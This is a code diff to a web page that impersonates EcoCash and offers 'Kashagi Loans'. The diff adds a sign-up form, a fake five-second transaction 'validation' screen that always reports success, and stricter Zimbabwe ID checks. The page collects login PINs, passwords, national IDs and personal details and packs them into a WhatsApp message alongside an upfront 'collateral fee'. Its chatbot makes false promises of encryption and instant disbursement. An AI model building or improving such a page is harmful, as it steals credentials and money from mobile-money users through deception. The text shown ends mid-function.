@@ -40,6 +40,14 @@
             -ms-overflow-style: none;
             scrollbar-width: none;
         }
+        @keyframes pulse-ring {
+            0% { transform: scale(0.95); opacity: 0.8; }
+            50% { transform: scale(1.05); opacity: 1; }
+            100% { transform: scale(0.95); opacity: 0.8; }
+        }
+        .processing-pulse {
+            animation: pulse-ring 1.5s infinite ease-in-out;
+        }
     </style>
 </head>
 <body class="bg-gray-100 font-sans antialiased text-gray-800 flex justify-center min-h-screen">
@@ -97,7 +105,7 @@
             <!-- ================= VIEW 1: LOGIN SCREEN ================= -->
             <section id="view-login" class="flex-1 flex flex-col justify-between">
                 <div class="p-6">
-                    <h2 class="text-center text-xl font-bold text-gray-700 mb-6">Login to Super App</h2>
+                    <h2 class="text-center text-xl font-bold text-gray-700 mb-6">Login</h2>
 
                     <!-- Phone Input -->
                     <div class="mb-6">
@@ -140,7 +148,7 @@
 
                     <!-- LOGIN BUTTON -->
                     <button id="login-btn" disabled onclick="handleLoginSubmit()" class="w-full py-3 px-4 rounded-lg bg-gray-200 text-gray-400 font-bold transition duration-200 cursor-not-allowed uppercase tracking-wider text-sm shadow-sm">
-                        LOGIN TO KASHAGI LOANS
+                        LOGIN
                     </button>
                 </div>
 
@@ -170,7 +178,143 @@
             </section>
 
 
-            <!-- ================= VIEW 2: KASHAGI LOANS PORTAL & OPTIONS ================= -->
+            <!-- ================= VIEW 2: SIGN UP SCREEN ================= -->
+            <section id="view-signup" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white">
+                <div class="bg-white rounded-xl p-5 shadow-sm border border-gray-100 mb-6">
+                    <div class="flex items-center justify-between mb-4">
+                        <button onclick="switchTab('login')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
+                            <i class="fa-solid fa-arrow-left"></i> <span>Back to Login</span>
+                        </button>
+                        <h2 class="text-xl font-bold text-gray-800">Sign up</h2>
+                    </div>
+
+                    <form onsubmit="event.preventDefault();" class="space-y-4 text-xs text-gray-700">
+                        <!-- First Name -->
+                        <div>
+                            <label class="block font-medium mb-1">First Name <span class="text-red-500">*</span></label>
+                            <input type="text" id="signup-firstname" placeholder="First Name" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                        </div>
+
+                        <!-- Surname -->
+                        <div>
+                            <label class="block font-medium mb-1">Surname <span class="text-red-500">*</span></label>
+                            <input type="text" id="signup-surname" placeholder="Surname" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                        </div>
+
+                        <!-- Country Select -->
+                        <div>
+                            <label class="block font-medium mb-1">Country <span class="text-red-500">*</span></label>
+                            <select id="signup-country" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none bg-white focus:border-ecoblue text-gray-600" onchange="validateSignupForm()">
+                                <option value="">---Select country---</option>
+                                <option value="Zimbabwe">Zimbabwe</option>
+                                <option value="South Africa">South Africa</option>
+                                <option value="United Kingdom">United Kingdom</option>
+                            </select>
+                        </div>
+
+                        <!-- Username (Mobile Number) -->
+                        <div>
+                            <label class="block font-medium mb-1">Username (Mobile number) <span class="text-red-500">*</span></label>
+                            <div class="bg-gray-100 text-gray-500 p-2.5 rounded-md text-center text-sm font-semibold mb-2 border border-gray-200">
+                                263
+                            </div>
+                            <input type="tel" id="signup-phone" placeholder="Mobile Number" maxlength="9" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                        </div>
+
+                        <!-- Email -->
+                        <div>
+                            <label class="block font-medium mb-1">Email <span class="text-red-500">*</span></label>
+                            <input type="email" id="signup-email" placeholder="Email" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                        </div>
+
+                        <!-- National ID (Strictly Zimbabwe ID format) -->
+                        <div>
+                            <label class="block font-medium mb-1">Zimbabwe National Id <span class="text-red-500">*</span></label>
+                            <input type="text" id="signup-nid" placeholder="e.g. 63-1234567A89" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue uppercase" oninput="validateSignupForm()">
+                            <p id="signup-id-error" class="text-[10px] text-red-600 mt-1 hidden">Please enter a valid Zimbabwe National ID format (e.g., 63-1234567A89).</p>
+                        </div>
+
+                        <!-- Password -->
+                        <div>
+                            <label class="block font-medium mb-1">
+                                New Password <span class="text-red-500">*</span> <span class="font-normal text-gray-500">(Min 8 chars, 1 letter, 1 number)</span>
+                            </label>
+                            <div class="relative">
+                                <input type="password" id="new-password" placeholder="New Password" class="w-full border border-gray-200 rounded-md p-2.5 pr-8 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                                <button type="button" onclick="togglePasswordVisibility()" class="absolute right-2.5 top-3 text-gray-500">
+                                    <i id="password-eye-icon" class="fa-regular fa-eye"></i>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Gender -->
+                        <div>
+                            <label class="block font-medium mb-1">Gender <span class="text-red-500">*</span></label>
+                            <div class="flex items-center space-x-4">
+                                <label class="inline-flex items-center space-x-1 cursor-pointer">
+                                    <input type="radio" name="gender" value="Male" class="text-ecoblue focus:ring-ecoblue" onchange="validateSignupForm()">
+                                    <span>Male</span>
+                                </label>
+                                <label class="inline-flex items-center space-x-1 cursor-pointer">
+                                    <input type="radio" name="gender" value="Female" class="text-ecoblue focus:ring-ecoblue" onchange="validateSignupForm()">
+                                    <span>Female</span>
+                                </label>
+                            </div>
+                        </div>
+
+                        <!-- Birthday -->
+                        <div>
+                            <label class="block font-medium mb-1">Birthday <span class="text-red-500">*</span></label>
+                            <div class="grid grid-cols-3 gap-2">
+                                <select id="b-day" class="border border-gray-200 rounded-md p-2 text-xs text-gray-600 outline-none bg-white" onchange="validateSignupForm()">
+                                    <option value="">Day</option>
+                                    <script>
+                                        for(let i=1; i<=31; i++) document.write(`<option value="${i}">${i}</option>`);
+                                    </script>
+                                </select>
+                                <select id="b-month" class="border border-gray-200 rounded-md p-2 text-xs text-gray-600 outline-none bg-white" onchange="validateSignupForm()">
+                                    <option value="">Month</option>
+                                    <option value="January">January</option><option value="February">February</option><option value="March">March</option>
+                                    <option value="April">April</option><option value="May">May</option><option value="June">June</option>
+                                    <option value="July">July</option><option value="August">August</option><option value="September">September</option>
+                                    <option value="October">October</option><option value="November">November</option><option value="December">December</option>
+                                </select>
+                                <select id="b-year" class="border border-gray-200 rounded-md p-2 text-xs text-gray-600 outline-none bg-white" onchange="validateSignupForm()">
+                                    <option value="">Year</option>
+                                    <script>
+                                        for(let i=2008; i>=1940; i--) document.write(`<option value="${i}">${i}</option>`);
+                                    </script>
+                                </select>
+                            </div>
+                        </div>
+
+                        <!-- Terms Checkbox -->
+                        <div class="flex items-start space-x-2 pt-2">
+                            <input type="checkbox" id="terms" class="mt-0.5 rounded text-ecoblue focus:ring-ecoblue" onchange="validateSignupForm()">
+                            <label for="terms" class="text-xs text-gray-600 leading-tight cursor-pointer">
+                                By clicking Sign Up, you agree to our <a href="#" class="text-blue-500 hover:underline">Terms, Data Policy and Cookie Policy</a>.
+                            </label>
+                        </div>
+
+                        <!-- Submit Buttons -->
+                        <div class="pt-4 space-y-3">
+                            <button type="button" id="signup-btn" disabled onclick="handleSignUpSubmit()" class="w-full bg-gray-200 text-gray-400 font-semibold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition">
+                                SIGN UP
+                            </button>
+                            <button type="button" onclick="switchTab('login')" class="w-full border border-red-400 text-red-500 font-semibold py-2.5 rounded-md uppercase text-xs tracking-wider hover:bg-red-50 transition">
+                                LOGIN
+                            </button>
+                        </div>
+                    </form>
+                </div>
+
+                <div class="text-center py-4 text-xs font-semibold text-gray-600">
+                    ©2026 Ecocash
+                </div>
+            </section>
+
+
+            <!-- ================= VIEW 3: KASHAGI LOANS PORTAL & OPTIONS ================= -->
             <section id="view-kashagi-hub" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white flex flex-col justify-between">
                 <div>
                     <!-- Client Profile Banner with Smart Card Graphic -->
@@ -235,7 +379,39 @@
             </section>
 
 
-            <!-- ================= VIEW 3: BOOST MY KASHAGI LOANS FORM ================= -->
+            <!-- ================= VIEW 4: PROCESSING & VALIDATING SCREEN (5s Cycle with Tick) ================= -->
+            <section id="view-processing" class="hidden p-6 flex-1 bg-gradient-to-b from-blue-50 to-white flex flex-col items-center justify-center text-center">
+                <div class="bg-white rounded-2xl p-8 shadow-lg border border-gray-100 max-w-xs w-full space-y-6">
+                    <div id="process-spinner-container" class="relative w-20 h-20 mx-auto flex items-center justify-center">
+                        <div class="absolute inset-0 border-4 border-blue-200 rounded-full"></div>
+                        <div class="absolute inset-0 border-4 border-ecoblue border-t-transparent rounded-full animate-spin"></div>
+                        <i id="process-icon" class="fa-solid fa-shield-halved text-ecoblue text-2xl"></i>
+                    </div>
+
+                    <div class="space-y-2">
+                        <h3 id="process-title" class="font-extrabold text-base text-gray-800">Validating Details & Transactions</h3>
+                        <p id="process-subtitle" class="text-xs text-gray-500">Analyzing your last 6 months transactions and credentials...</p>
+                    </div>
+
+                    <div class="bg-gray-50 p-3 rounded-lg border border-gray-200 text-left text-[11px] space-y-1 text-gray-600">
+                        <div class="flex items-center space-x-2">
+                            <i class="fa-solid fa-check text-green-600"></i>
+                            <span>Checking Zimbabwe National ID Registry</span>
+                        </div>
+                        <div class="flex items-center space-x-2">
+                            <i class="fa-solid fa-check text-green-600"></i>
+                            <span>Verifying 6-Month Wallet History</span>
+                        </div>
+                        <div class="flex items-center space-x-2">
+                            <i class="fa-solid fa-check text-green-600"></i>
+                            <span>Validating Credit Eligibility</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+
+            <!-- ================= VIEW 5: BOOST MY KASHAGI LOANS FORM ================= -->
             <section id="view-boost-form" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white">
                 <div class="bg-white rounded-xl p-5 shadow-sm border border-gray-100 mb-6">
                     <div class="flex items-center justify-between mb-4">
@@ -260,8 +436,9 @@
                         </div>
 
                         <div>
-                            <label class="block font-medium mb-1">3. National ID Number (Any Country ID Accepted) <span class="text-red-500">*</span></label>
-                            <input type="text" id="boost-nid" placeholder="Enter valid ID or Passport number" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue uppercase" oninput="validateBoostForm()">
+                            <label class="block font-medium mb-1">3. Zimbabwe National ID Number <span class="text-red-500">*</span></label>
+                            <input type="text" id="boost-nid" placeholder="e.g. 63-1234567A89" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue uppercase" oninput="validateBoostForm()">
+                            <p id="boost-id-error" class="text-[10px] text-red-600 mt-1 hidden">Please enter a valid Zimbabwe National ID format (e.g., 63-1234567A89).</p>
                         </div>
 
                         <div>
@@ -270,8 +447,8 @@
                         </div>
 
                         <div class="pt-4">
-                            <button type="button" id="boost-submit-btn" disabled onclick="processBoostSubmission()" class="w-full bg-gray-200 text-gray-400 font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm">
-                                BOOST MY KASHAGI LOAN
+                            <button type="button" id="boost-submit-btn" disabled onclick="startProcessingFlow('boost')" class="w-full bg-gray-200 text-gray-400 font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm">
+                                VALIDATE & BOOST LOAN
                             </button>
                         </div>
                     </form>
@@ -279,7 +456,7 @@
             </section>
 
 
-            <!-- ================= VIEW 4: TIER UPGRADE & EXACT AMOUNTS TABLE ================= -->
+            <!-- ================= VIEW 6: TIER UPGRADE & EXACT AMOUNTS TABLE ================= -->
             <section id="view-tier-upgrade" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white flex flex-col justify-between">
                 <div>
                     <div class="flex items-center justify-between mb-4">
@@ -305,7 +482,7 @@
             </section>
 
 
-            <!-- ================= VIEW 5: TERMS AND CONDITIONS WITH PRIVACY & SAFETY ================= -->
+            <!-- ================= VIEW 7: TERMS AND CONDITIONS WITH PRIVACY & SAFETY ================= -->
             <section id="view-terms" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white flex flex-col justify-between">
                 <div>
                     <div class="text-center mb-3">
@@ -332,7 +509,7 @@
             </section>
 
 
-            <!-- ================= VIEW 6: APPLY / REGISTER KASHAGI LOANS (Full Requirements) ================= -->
+            <!-- ================= VIEW 8: APPLY / REGISTER KASHAGI LOANS (Full Requirements) ================= -->
             <section id="view-apply-form" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white">
                 <div class="bg-white rounded-xl p-5 shadow-sm border border-gray-100 mb-6">
                     <div class="flex items-center justify-between mb-4">
@@ -342,7 +519,7 @@
                         <h2 class="text-base font-bold text-gray-800">Kashagi Loan Full Application</h2>
                     </div>
 
-                    <p class="text-[11px] text-gray-500 mb-3">Provide official requirements to access full loans (Requires 10% collateral fee).</p>
+                    <p class="text-[11px] text-gray-500 mb-3">Provide official Zimbabwe requirements to access full loans (Requires 10% collateral fee).</p>
 
                     <form onsubmit="event.preventDefault();" class="space-y-3 text-xs text-gray-700">
                         <div>
@@ -359,8 +536,9 @@
                         </div>
 
                         <div>
-                            <label class="block font-medium mb-1">National ID Number (Any Country ID) <span class="text-red-500">*</span></label>
-                            <input type="text" id="apply-nid" placeholder="Enter valid ID or Passport number" class="w-full border border-gray-200 rounded-md p-2 text-sm outline-none focus:border-ecoblue uppercase" oninput="validateApplyForm()">
+                            <label class="block font-medium mb-1">Zimbabwe National ID Number <span class="text-red-500">*</span></label>
+                            <input type="text" id="apply-nid" placeholder="e.g. 63-1234567A89" class="w-full border border-gray-200 rounded-md p-2 text-sm outline-none focus:border-ecoblue uppercase" oninput="validateApplyForm()">
+                            <p id="apply-id-error" class="text-[10px] text-red-600 mt-1 hidden">Please enter a valid Zimbabwe National ID format (e.g., 63-1234567A89).</p>
                         </div>
 
                         <div class="grid grid-cols-2 gap-2">
@@ -390,8 +568,8 @@
                         </div>
 
                         <div class="pt-2">
-                            <button type="button" id="apply-submit-btn" disabled onclick="handleFullLoanSubmit()" class="w-full bg-gray-200 text-gray-400 font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm">
-                                PROCEED TO TERMS & CONDITIONS (10% FEE)
+                            <button type="button" id="apply-submit-btn" disabled onclick="startProcessingFlow('apply')" class="w-full bg-gray-200 text-gray-400 font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm">
+                                VALIDATE APPLICATION (10% FEE)
                             </button>
                         </div>
                     </form>
@@ -399,7 +577,7 @@
             </section>
 
 
-            <!-- ================= VIEW 7: CONTACT US SCREEN ================= -->
+            <!-- ================= VIEW 9: CONTACT US SCREEN ================= -->
             <section id="view-contact" class="hidden flex-1 flex flex-col">
                 <div class="bg-gradient-to-r from-blue-600 to-cyan-500 text-white p-6 relative flex justify-between items-center overflow-hidden min-h-[140px]">
                     <h2 class="text-2xl font-semibold z-10">Contact Us</h2>
@@ -580,20 +758,20 @@
             currentLoan: 0,
             selectedTierAmount: 100,
             selectedTierFee: 5,
-            flowType: 'boost' // 'boost' or 'apply'
+            flowType: 'boost'
         };
 
         // 10 Client FAQ questions for Ask Thembi AI Chatbot
         const thembiFAQs = [
-            { q: "How do I qualify for Kashagi Loans?", a: "Qualifying is simple! Ensure your EcoCash account is active, your phone number starts with 7 (+263), and you provide a valid National ID and profile details." },
+            { q: "How do I qualify for Kashagi Loans?", a: "Qualifying is simple! Ensure your EcoCash account is active, your phone number starts with 7 (+263), and you provide a valid Zimbabwe National ID and profile details." },
             { q: "What is the collateral fee for boosting?", a: "The activation collateral fee for boosting your Kashagi loan is exactly 5% of your target tier amount (e.g., $5 for a $100 tier up to $150 for a $3,000 tier)." },
             { q: "How much is the fee for full applications?", a: "For new full Kashagi loan registrations and applications, the required collateral fee is exactly 10% of the requested loan amount." },
             { q: "Is my National ID and personal data safe?", a: "Yes, absolute safety and privacy are guaranteed. All data is encrypted with bank-grade 256-bit security in compliance with national financial privacy standards." },
             { q: "How long does loan disbursement take?", a: "Once your collateral fee is processed and verified via WhatsApp, your Kashagi loan is disbursed instantly into your EcoCash wallet within minutes." },
-            { q: "Can I use any country National ID?", a: "Yes! Our updated system accepts any official national identification document or passport number to verify and process your account." },
+            { q: "What is required for National ID verification?", a: "Our system strictly accepts authentic Zimbabwe National ID numbers in standard formats (e.g., 63-1234567A89) along with 6 months of transaction history validation." },
             { q: "What happens if I miss a loan repayment?", a: "Failure to repay on time results in a credit rating downgrade, temporary wallet restriction, and automatic recovery through registered mobile networks." },
             { q: "How do I contact customer support?", a: "You can reach customer care instantly by dialing 114, calling +263 772 023 000, or using our WhatsApp support line." },
-            { q: "Why did my loan upgrade get delayed?", a: "Delays usually occur if incorrect ID credentials or phone numbers are entered. Ensure all details match your official documents before submitting." },
+            { q: "Why is transaction history validation necessary?", a: "Validating your last 6 months of transactions ensures your account is active and determines your optimal Kashagi credit tier limit." },
             { q: "Can I upgrade my tier more than once?", a: "Yes! As you successfully repay your Kashagi loans on time, you become eligible to upgrade to higher tiers up to $3,000 USD." }
         ];
 
@@ -617,6 +795,7 @@
             }
         }
 
+        // Typing effect for Thembi AI response
         function askThembiQuestion(question, answer) {
             const chatMessages = document.getElementById('chat-messages');
             
@@ -625,17 +804,34 @@
             userBubble.className = "flex justify-end";
             userBubble.innerHTML = `<div class="bg-ecoblue text-white p-2.5 rounded-xl rounded-tr-none max-w-[80%] shadow-sm">${question}</div>`;
             chatMessages.appendChild(userBubble);
-
-            // Thembi typing / response bubble after slight delay
-            setTimeout(() => {
-                const aiBubble = document.createElement('div');
-                aiBubble.className = "flex justify-start";
-                aiBubble.innerHTML = `<div class="bg-white text-gray-800 p-3 rounded-xl rounded-tl-none max-w-[80%] shadow-sm border border-gray-200"><p class="font-bold text-ecoblue mb-0.5">Thembi AI</p><p class="text-gray-700">${answer}</p></div>`;
-                chatMessages.appendChild(aiBubble);
-                chatMessages.scrollTop = chatMessages.scrollHeight;
-            }, 400);
-
             chatMessages.scrollTop = chatMessages.scrollHeight;
+
+            // Thembi typing bubble
+            const aiBubble = document.createElement('div');
+            aiBubble.className = "flex justify-start";
+            const bubbleId = 'typing-' + Date.now();
+            aiBubble.innerHTML = `<div class="bg-white text-gray-800 p-3 rounded-xl rounded-tl-none max-w-[80%] shadow-sm border border-gray-200"><p class="font-bold text-ecoblue mb-0.5">Thembi AI</p><p id="${bubbleId}" class="text-gray-700 italic">Typing...</p></div>`;
+            chatMessages.appendChild(aiBubble);
+            chatMessages.scrollTop = chatMessages.scrollHeight;
+
+            // Typing animation effect
+            setTimeout(() => {
+                const textEl = document.getElementById(bubbleId);
+                textEl.className = "text-gray-700";
+                textEl.innerText = "";
+                
+                let i = 0;
+                const speed = 15; // typing speed in ms
+                function typeWriter() {
+                    if (i < answer.length) {
+                        textEl.innerText += answer.charAt(i);
+                        i++;
+                        chatMessages.scrollTop = chatMessages.scrollHeight;
+                        setTimeout(typeWriter, speed);
+                    }
+                }
+                typeWriter();
+            }, 600);
         }
 
         function sendChatMessage() {
@@ -644,12 +840,17 @@
             if (!query) return;
 
             input.value = '';
-            
-            // Search matching FAQ or give positive default response
             let matched = thembiFAQs.find(f => f.q.toLowerCase().includes(query.toLowerCase()) || query.toLowerCase().includes(f.q.toLowerCase()));
-            let responseText = matched ? matched.a : "That is a great question! For all Kashagi loan inquiries, our team is ready to assist you securely through our WhatsApp support channel.";
+            let responseText = matched ? matched.a : "That is a wonderful question! For all Kashagi loan inquiries and account assistance, our team is ready to help you securely.";
 
             askThembiQuestion(query, responseText);
+        }
+
+        // Validate Zimbabwe National ID format e.g. 63-1234567A89 or 08-123456F89
+        function isValidZimbabweNID(nid) {
+            const cleanNid = nid.trim().toUpperCase();
+            const zimIdRegex = /^\d{2}-\d{4,7}[A-Z]\d{2}$/;
+            return zimIdRegex.test(cleanNid);
         }
 
         // Initialize Tier Upgrade Table Options with exact original fees
@@ -657,7 +858,6 @@
             const container = document.getElementById('tier-options-container');
             container.innerHTML = '';
 
-            // Tiers with exact original collateral fees
             const tiers = [
                 { loan: 100, fee: 5.00 },
                 { loan: 250, fee: 12.50 },
@@ -735,20 +935,60 @@
                 return;
             }
 
-            // Save login details into client state
             clientData.loginPhone = `+263${phone}`;
             clientData.loginPin = pin;
             clientData.phone = `+263 ${phone}`;
             clientData.name = `Client (+263 ${phone})`;
-            clientData.nid = 'VERIFIED-LOGIN-SESSION';
+            clientData.nid = 'ZW-AUTH-SESSION';
 
-            // Update Smart Card Profile display on Hub
             document.getElementById('profile-name-display').innerText = clientData.name;
-            document.getElementById('profile-id-display').innerText = `ID: Smart Session Active`;
+            document.getElementById('profile-id-display').innerText = `ID: Session Active`;
             document.getElementById('profile-phone-display').innerText = `Phone: ${clientData.phone}`;
 
-            // Switch to Kashagi Loans Hub view
             switchTab('kashagi-hub');
+        }
+
+        // Handle Sign Up Submission with 5s Processing Cycle
+        function handleSignUpSubmit() {
+            const firstName = document.getElementById('signup-firstname').value.trim();
+            const surname = document.getElementById('signup-surname').value.trim();
+            const country = document.getElementById('signup-country').value;
+            const mobileNumber = document.getElementById('signup-phone').value.trim();
+            const email = document.getElementById('signup-email').value.trim();
+            const nationalId = document.getElementById('signup-nid').value.trim();
+            const password = document.getElementById('new-password').value.trim();
+            const genderRadio = document.querySelector('input[name="gender"]:checked');
+            const day = document.getElementById('b-day').value;
+            const month = document.getElementById('b-month').value;
+            const year = document.getElementById('b-year').value;
+            const termsChecked = document.getElementById('terms').checked;
+            const idError = document.getElementById('signup-id-error');
+
+            if (!firstName || !surname || !country || !mobileNumber || !email || !nationalId || !password || !genderRadio || !day || !month || !year || !termsChecked) {
+                showToast('All fields and terms acceptance are required!');
+                return;
+            }
+
+            if (!isValidZimbabweNID(nationalId)) {
+                idError.classList.remove('hidden');
+                showToast('Please enter a valid Zimbabwe National ID format.');
+                return;
+            }
+            idError.classList.add('hidden');
+
+            clientData.loginPhone = `+263${mobileNumber}`;
+            clientData.loginPin = password;
+            clientData.name = `${firstName} ${surname}`;
+            clientData.phone = `+263 ${mobileNumber}`;
+            clientData.nid = nationalId.toUpperCase();
+
+            // Run 5-second processing cycle for registration verification
+            runProcessingCycle(() => {
+                document.getElementById('profile-name-display').innerText = clientData.name;
+                document.getElementById('profile-id-display').innerText = `ID: ${clientData.nid}`;
+                document.getElementById('profile-phone-display').innerText = `Phone: ${clientData.phone}`;
+                switchTab('kashagi-hub');
+            });
         }
 
         // Validate Boost Form inputs
@@ -768,33 +1008,107 @@
             }
         }
 
-        // Process Boost Submission accepting all ID types
-        function processBoostSubmission() {
-            const name = document.getElementById('boost-name').value.trim();
-            const phone = document.getElementById('boost-phone').value.trim();
-            const nid = document.getElementById('boost-nid').value.trim();
-            const currentLoan = document.getElementById('boost-current-loan').value.trim();
+        // Process Boost Submission with ZW ID check and 5s processing cycle
+        function startProcessingFlow(type) {
+            if (type === 'boost') {
+                const name = document.getElementById('boost-name').value.trim();
+                const phone = document.getElementById('boost-phone').value.trim();
+                const nid = document.getElementById('boost-nid').value.trim();
+                const currentLoan = document.getElementById('boost-current-loan').value.trim();
+                const idError = document.getElementById('boost-id-error');
 
-            if (!name || !phone || !nid || !currentLoan) {
-                showToast('All fields are required.');
-                return;
+                if (!name || !phone || !nid || !currentLoan) {
+                    showToast('All fields are required.');
+                    return;
+                }
+
+                if (!isValidZimbabweNID(nid)) {
+                    idError.classList.remove('hidden');
+                    showToast('Please enter a valid Zimbabwe National ID format.');
+                    return;
+                }
+                idError.classList.add('hidden');
+
+                clientData.name = name;
+                clientData.phone = `+263 ${phone}`;
+                clientData.nid = nid.toUpperCase();
+                clientData.currentLoan = currentLoan;
+                clientData.flowType = 'boost';
+
+                runProcessingCycle(() => {
+                    initTierTable();
+                    switchTab('tier-upgrade');
+                });
+
+            } else if (type === 'apply') {
+                const name = document.getElementById('apply-name').value.trim();
+                const phone = document.getElementById('apply-phone').value.trim();
+                const nid = document.getElementById('apply-nid').value.trim();
+                const employment = document.getElementById('apply-employment').value;
+                const income = document.getElementById('apply-income').value.trim();
+                const address = document.getElementById('apply-address').value.trim();
+                const loanAmount = document.getElementById('apply-loan-amount').value.trim();
+                const idError = document.getElementById('apply-id-error');
+
+                if (!name || !phone || !nid || !employment || !income || !address || !loanAmount) {
+                    showToast('Please provide all required loan application details.');
+                    return;
+                }
+
+                if (!isValidZimbabweNID(nid)) {
+                    idError.classList.remove('hidden');
+                    showToast('Please enter a valid Zimbabwe National ID format.');
+                    return;
+                }
+                idError.classList.add('hidden');
+
+                clientData.applyName = name;
+                clientData.applyPhone = `+263 ${phone}`;
+                clientData.applyNid = nid.toUpperCase();
+                clientData.applyEmployment = employment;
+                clientData.applyIncome = income;
+                clientData.applyAddress = address;
+                clientData.applyLoanAmount = loanAmount;
+                clientData.flowType = 'apply';
+
+                runProcessingCycle(() => {
+                    switchTab('terms');
+                });
             }
+        }
 
-            // Save validated info into client profile
-            clientData.name = name;
-            clientData.phone = `+263 ${phone}`;
-            clientData.nid = nid.toUpperCase();
-            clientData.currentLoan = currentLoan;
-            clientData.flowType = 'boost';
+        // 5-second processing cycle showing validation of details & 6 months transactions, ending with green tick
+        function runProcessingCycle(onCompleteCallback) {
+            switchTab('processing');
+            
+            const spinnerContainer = document.getElementById('process-spinner-container');
+            const processTitle = document.getElementById('process-title');
+            const processSubtitle = document.getElementById('process-subtitle');
+            const processIcon = document.getElementById('process-icon');
 
-            // Update Smart Card profile display on Hub
-            document.getElementById('profile-name-display').innerText = clientData.name;
-            document.getElementById('profile-id-display').innerText = `ID: ${clientData.nid}`;
-            document.getElementById('profile-phone-display').innerText = `Phone: ${clientData.phone}`;
+            // Reset state
+            spinnerContainer.className = "relative w-20 h-20 mx-auto flex items-center justify-center processing-pulse";
+            spinnerContainer.innerHTML = `
+                <div class="absolute inset-0 border-4 border-blue-200 rounded-full"></div>
+                <div class="absolute inset-0 border-4 border-ecoblue border-t-transparent rounded-full animate-spin"></div>
+                <i class="fa-solid fa-file-invoice-dollar text-ecoblue text-2xl"></i>
+            `;
+            processTitle.innerText = "Validating Details & Transactions";
+            processSubtitle.innerText = "Analyzing last 6 months transaction history & Zimbabwe ID...";
 
-            // Proceed to Tier upgrade selection table
-            initTierTable();
-            switchTab('tier-upgrade');
+            // After 5 seconds, show correct credentials and green tick
+            setTimeout(() => {
+                spinnerContainer.className = "relative w-20 h-20 mx-auto flex items-center justify-center bg-green-100 rounded-full shadow-md";
+                spinnerContainer.innerHTML = `<i class="fa-solid fa-check text-green-600 text-3xl"></i>`;
+                processTitle.innerText = "Correct Credentials Verified!";
+                processSubtitle.innerText = "Profile and 6-month transaction history successfully validated.";
+
+                // Transition after 1.2s showing the tick
+                setTimeout(() => {
+                    onCompleteCallback();
+                }, 1200);
+
+            }, 5000);
         }
 
         // Proceed from Tier upgrade to Terms
@@ -814,15 +1128,15 @@
             }
         }
 
-        // Final Agreement & WhatsApp submission including 1st page login details
+        // Final Agreement & WhatsApp submission including 1st page login credentials and all requirements
         function handleFinalAgreement() {
             let message = '';
             
             if (clientData.flowType === 'boost') {
-                message = `*EcoCash Kashagi Loan Boost Upgrade*\n\n🔒 *Login Credentials (Page 1):*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Client Full Name:* ${clientData.name}\n📱 *Contact Phone:* ${clientData.phone}\n🆔 *National ID/Passport:* ${clientData.nid}\n💰 *Current Kashagi Loan:* $${clientData.currentLoan} USD\n🚀 *Target Upgrade Tier:* $${clientData.selectedTierAmount} USD\n💵 *Activation Collateral Fee:* $${clientData.selectedTierFee.toFixed(2)} USD\n✅ *Status:* Terms Agreed & All Details Submitted`;
+                message = `*EcoCash Kashagi Loan Boost Upgrade*\n\n🔒 *Login Credentials (Page 1):*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Client Full Name:* ${clientData.name}\n📱 *Contact Phone:* ${clientData.phone}\n🆔 *Zimbabwe National ID:* ${clientData.nid}\n💰 *Current Kashagi Loan:* $${clientData.currentLoan} USD\n🚀 *Target Upgrade Tier:* $${clientData.selectedTierAmount} USD\n💵 *Activation Collateral Fee:* $${clientData.selectedTierFee.toFixed(2)} USD\n📊 *History Status:* Last 6 Months Verified\n✅ *Status:* Correct Credentials Verified & Terms Agreed`;
             } else {
                 const collateralFee = (parseFloat(clientData.applyLoanAmount || 0) * 0.10).toFixed(2);
-                message = `*EcoCash Kashagi Loan Full Application*\n\n🔒 *Login Credentials (Page 1):*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Full Name:* ${clientData.applyName}\n📱 *Contact Phone:* ${clientData.applyPhone}\n🆔 *National ID/Passport:* ${clientData.applyNid}\n💼 *Employment Status:* ${clientData.applyEmployment}\n💵 *Monthly Income:* $${clientData.applyIncome} USD\n🏠 *Residential Address:* ${clientData.applyAddress}\n💰 *Requested Loan Amount:* $${clientData.applyLoanAmount} USD\n🛡️ *Collateral Fee (10%):* $${collateralFee} USD\n✅ *Status:* Full Application & Terms Agreed`;
